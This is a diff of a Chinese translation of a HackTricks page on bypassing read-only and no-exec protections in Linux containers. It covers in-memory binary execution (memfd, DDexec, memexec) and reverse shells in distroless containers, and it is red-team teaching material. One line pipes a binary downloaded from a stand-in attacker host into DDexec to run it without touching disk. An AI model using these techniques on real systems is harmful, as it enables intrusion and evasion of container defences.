@@ -2,21 +2,21 @@
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
 支持HackTricks的其他方式：
 
-* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏](https://opensea.io/collection/the-peass-family)
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
 * **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-如果您对**黑客职业**感兴趣并想要黑掉不可能黑掉的东西 - **我们正在招聘！**（需要流利的波兰语书面和口头表达能力）。
+如果您对**黑客职业**感兴趣并想要攻破不可能的东西 - **我们正在招聘！**（需要流利的波兰语书面和口头表达能力）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -29,7 +29,7 @@
 
 ## 只读 / 无执行场景
 
-在Linux机器上发现**只读（ro）文件系统保护**变得越来越常见，特别是在容器中。这是因为在容器中运行只读文件系统只需在`securitycontext`中设置**`readOnlyRootFilesystem: true`**即可：
+在Linux机器上发现**只读（ro）文件系统保护**变得越来越普遍，特别是在容器中。这是因为在容器中运行只读文件系统只需在`securitycontext`中设置**`readOnlyRootFilesystem: true`**即可：
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -44,10 +44,10 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-然而，即使文件系统以只读方式挂载，**`/dev/shm`**仍然是可写的，因此我们可以在磁盘上写入内容。但是，此文件夹将以**无执行保护**挂载，因此如果您在此处下载二进制文件，则**无法执行**。
+然而，即使文件系统被挂载为只读，**`/dev/shm`**仍然是可写的，因此我们可以在磁盘上写入内容。但是，此文件夹将以**无执行保护**挂载，因此如果您在此处下载二进制文件，则**无法执行**它。
 
 {% hint style="warning" %}
-从红队的角度来看，这使得下载和执行不在系统中的二进制文件（如后门或类似`kubectl`的枚举器）变得**复杂**。
+从红队的角度来看，这使得**下载和执行**系统中不存在的二进制文件（如后门或类似`kubectl`的枚举器）变得**复杂**。
 {% endhint %}
 
 ## 最简单的绕过方法：脚本
@@ -58,28 +58,28 @@ securityContext:
 
 ## 内存绕过
 
-如果您想执行一个二进制文件，但文件系统不允许，最好的方法是通过**从内存中执行**，因为**这些保护在内存中不适用**。
+如果您想执行一个二进制文件，但文件系统不允许，最好的方法是**从内存中执行**，因为**这些保护在内存中不适用**。
 
 ### FD + exec系统调用绕过
 
 如果您在机器内部有一些强大的脚本引擎，比如**Python**、**Perl**或**Ruby**，您可以将要执行的二进制文件下载到内存中，将其存储在一个内存文件描述符（`create_memfd`系统调用）中，这不会受到这些保护的保护，然后调用**`exec`系统调用**，指示**将fd作为要执行的文件**。
 
-为此，您可以轻松使用项目[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)。您可以将二进制文件传递给它，它将生成一个以指定语言编写的脚本，其中包含**使用指令对二进制文件进行压缩和b64编码**的说明，以及在调用`create_memfd`系统调用创建`fd`并调用**exec**系统调用来运行它。
+为此，您可以轻松使用项目[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)。您可以将二进制文件传递给它，它将生成一个以指定语言编写的脚本，其中包含**使用指令对二进制文件进行解码和解压缩**的二进制文件压缩和b64编码，并调用`create_memfd`系统调用创建的fd以及调用**exec**系统调用来运行它的指令。
 
 {% hint style="warning" %}
-这在其他脚本语言（如PHP或Node）中不起作用，因为它们没有任何从脚本中**调用原始系统调用**的默认方法，因此无法调用`create_memfd`来创建**内存fd**以存储二进制文件。
+这在其他脚本语言（如PHP或Node）中不起作用，因为它们没有任何从脚本中调用原始系统调用的**默认方法**，因此无法调用`create_memfd`来创建**存储二进制文件的内存fd**。
 
-此外，在`/dev/shm`中创建一个**常规fd**中的文件是行不通的，因为您将无法运行它，因为**无执行保护**将适用。
+此外，在`/dev/shm`中创建一个**常规fd**中的文件将不起作用，因为您将无法运行它，因为**无执行保护**将适用。
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)是一种允许您通过覆盖其**`/proc/self/mem`**来**修改自己进程的内存**的技术。
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)是一种技术，允许您通过覆盖其**`/proc/self/mem`**来**修改自己进程的内存**。
 
 因此，通过**控制进程执行的汇编代码**，您可以编写一个**shellcode**并“变异”进程以**执行任意代码**。
 
 {% hint style="success" %}
-**DDexec / EverythingExec**将允许您从**内存**加载和**执行**您自己的**shellcode**或**任何二进制文件**。
+**DDexec / EverythingExec**将允许您从**内存**中加载和**执行**自己的**shellcode**或**任何二进制文件**。
 {% endhint %}
 ```bash
 # Basic example
@@ -89,7 +89,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 [**Memexec**](https://github.com/arget13/memexec)是DDexec的自然下一步。它是一个**DDexec shellcode demonised**，因此每次您想要**运行不同的二进制文件**时，您无需重新启动DDexec，只需通过DDexec技术运行memexec shellcode，然后**与此守护进程通信以传递要加载和运行的新二进制文件**。
 
-您可以在[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)中找到如何使用**memexec从PHP反向shell执行二进制文件**的示例。
+您可以在[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)中找到如何使用**memexec执行来自PHP反向shell的二进制文件**的示例。
 
 ### Memdlopen
 
@@ -105,27 +105,27 @@ Distroless容器的目标是通过消除不必要的组件**减少容器的攻�
 
 ### 反向Shell
 
-在distroless容器中，您可能**找不到`sh`或`bash`**以获取常规shell。您也不会找到诸如`ls`、`whoami`、`id`等二进制文件...通常在系统中运行的所有内容。
+在distroless容器中，您可能**找不到`sh`或`bash`**以获取常规shell。您也不会找到诸如`ls`、`whoami`、`id`等二进制文件...您通常在系统中运行的所有内容。
 
 {% hint style="warning" %}
-因此，您**将无法**像通常那样获得**反向shell**或**枚举**系统。
+因此，您将**无法**像通常那样获得**反向shell**或**枚举**系统。
 {% endhint %}
 
-但是，如果受损的容器例如正在运行flask web，则已安装了python，因此您可以获取**Python反向shell**。如果正在运行node，则可以获取Node反向shell，大多数任何**脚本语言**都可以。
+但是，如果受损的容器例如正在运行flask web，则已安装了python，因此您可以获取**Python反向shell**。如果正在运行node，则可以获取Node反向shell，大多数**脚本语言**也是如此。
 
 {% hint style="success" %}
 使用脚本语言，您可以使用语言功能**枚举系统**。
 {% endhint %}
 
-如果没有**`read-only/no-exec`**保护，您可以滥用反向shell在文件系统中**写入您的二进制文件**并**执行**它们。
+如果没有**`只读/无执行`**保护，您可以滥用您的反向shell**在文件系统中写入您的二进制文件**并**执行**它们。
 
 {% hint style="success" %}
-但是，在这种类型的容器中，这些保护通常存在，但您可以使用**先前的内存执行技术来绕过它们**。
+但是，在这种类型的容器中，这些保护通常会存在，但您可以使用**先前的内存执行技术来绕过它们**。
 {% endhint %}
 
-您可以在[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)中找到如何**利用一些RCE漏洞**获取脚本语言**反向shell**并从内存中执行二进制文件的**示例**。
+您可以在[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)中找到如何**利用一些RCE漏洞**来获取脚本语言**反向shell**并从内存中执行二进制文件的**示例**。
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 如果您对**黑客职业**感兴趣并想要黑入不可黑入的 - **我们正在招聘！**（需要流利的波兰语书面和口语）。
 
